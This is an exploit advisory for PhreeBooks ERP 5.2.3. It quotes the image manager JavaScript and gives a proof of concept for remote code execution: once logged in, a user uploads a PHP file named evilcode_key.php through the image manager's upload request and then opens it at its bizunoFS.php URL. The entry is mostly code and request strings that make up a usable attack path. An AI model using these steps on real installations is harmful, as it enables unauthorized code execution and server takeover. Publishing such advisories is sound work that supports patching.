
# Exploit Author: Abdullah Ã‡elebi
# Vendor Homepage: https://www.phreesoft.com/
# Software Link: https://sourceforge.net/projects/phreebooks/files/latest/download
# Category: Webapps
# Version: 5.2.3
# Tested on: WAMPP @Win
# Software description:
PhreeBooks 5 is a completely new web based application that utilizes the
redesigned Bizuno ERP library from PhreeSoft. Bizuno supports PHP 7 along
with all the latest versions of mySQL. Additionally, Bizuno utilizes the
jQuery EasyUI graphical interface and will be also enhanced for mobile
devices and tablets.

# Vulnerabilities:
# An attacker could run a remote code after an authorized user login using
the parameter.

# Code Section @Tools>Image Manager

//
<script type="text/javascript">

function imgAction(action) { jq(&#039;#imgAction&#039;).val(action); imgRefresh(); }
function imgClickImg(strImage) {
    var lastChar = strImage.substr(strImage.length - 1);
    if (lastChar == &#039;/&#039;) {
        jq(&#039;#imgMgrPath&#039;).val(jq(&#039;#imgMgrPath&#039;).val()+&#039;/&#039;+strImage);
        jq(&#039;#imgAction&#039;).val(&#039;refresh&#039;);
        imgRefresh();
    } else if (jq(&#039;#imgTarget&#039;).val()) {
        var target = jq(&#039;#imgTarget&#039;).val();
        var path   = jq(&#039;#imgMgrPath&#039;).val();
        var fullPath= path ? path+&#039;/&#039;+strImage : strImage;
        jq(&#039;#imgTarget&#039;).val(fullPath);
        jq(&#039;#&#039;+target).val(fullPath);
        jq(&#039;#img_&#039;+target).attr(&#039;src&#039;,
bizunoAjaxFS+&#039;&src=0/images/&#039;+fullPath);
        bizWindowClose(&#039;winImgMgr&#039;);
    }
}
function imgRefresh() {
    var target = jq(&#039;#imgTarget&#039;).val();
    var path   = jq(&#039;#imgMgrPath&#039;).val();
    var search = jq(&#039;#imgSearch&#039;).val();
    var action = jq(&#039;#imgAction&#039;).val();
    var shref  =
&#039;index.php?&p=bizuno/image/manager&imgTarget=&#039;+target+&#039;&imgMgrPath=&#039;+path+&#039;&imgSearch=&#039;+search+&#039;&imgAction=&#039;;
    if (action == &#039;upload&#039;) {
        jq(&#039;#frmImgMgr&#039;).submit(function (e) {
            jq.ajax({
                url:        shref+&#039;upload&#039;,
                type:       &#039;post&#039;,
                data:       new FormData(this),
                mimeType:   &#039;multipart/form-data&#039;,
                contentType:false,
                cache:      false,
                processData:false,
                success:    function (data) { processJson(data);
jq(&#039;#winImgMgr&#039;).window(&#039;refresh&#039;,shref+&#039;refresh&#039;); }
            });
        });
        jq(&#039;#frmImgMgr&#039;).submit();
    } else {
        jq(&#039;#winImgMgr&#039;).window(&#039;refresh&#039;, shref+action);
    }
}
jq(&#039;#winImgMgr&#039;).window({&#039;title&#039;:&#039;Image Manager: /&#039;});
</script>



# POC - RCE via Arbitrary File Upload :

Process during upload malicious file;
http://localhost/PhreeBooksERP/index.php?&p=bizuno/image/manager&imgTarget=&imgMgrPath=&imgSearch=&imgAction=upload

Post section details;
imgSearch=&imgFile=evilcode_key.php

Result;
http://localhost/PhreeBooksERP/bizunoFS.php?&src=0/images/evilcode_key.php

